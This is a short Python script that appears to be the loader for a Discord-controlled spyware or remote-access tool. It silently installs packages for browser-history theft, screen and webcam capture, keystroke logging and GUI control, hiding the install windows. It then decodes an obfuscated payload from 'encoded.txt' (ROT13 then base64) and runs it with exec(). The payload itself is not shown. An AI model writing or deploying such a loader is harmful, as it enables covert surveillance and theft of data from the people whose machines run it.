import base64
import codecs
import subprocess

reqs = [
    'browserhistory==0.1.2',
    'comtypes==1.1.10',
    'discord.py==1.7.3',
    'mss==6.1.0',
    'opencv_python==4.5.5.62',
    'PyAutoGUI==0.9.53',
    'pynput==1.7.6',
    'requests==2.22.0',
    'pywin32==303',
]

for req in reqs:
    make = 'pip3 install ' + req
    subprocess.run(make, creationflags=0x08000000)

r13code = open('encoded.txt', 'r').read()
b64code = codecs.decode(r13code, 'rot_13')
code = base64.b64decode(b64code.encode('utf-8')).decode('utf-8')

exec(code)
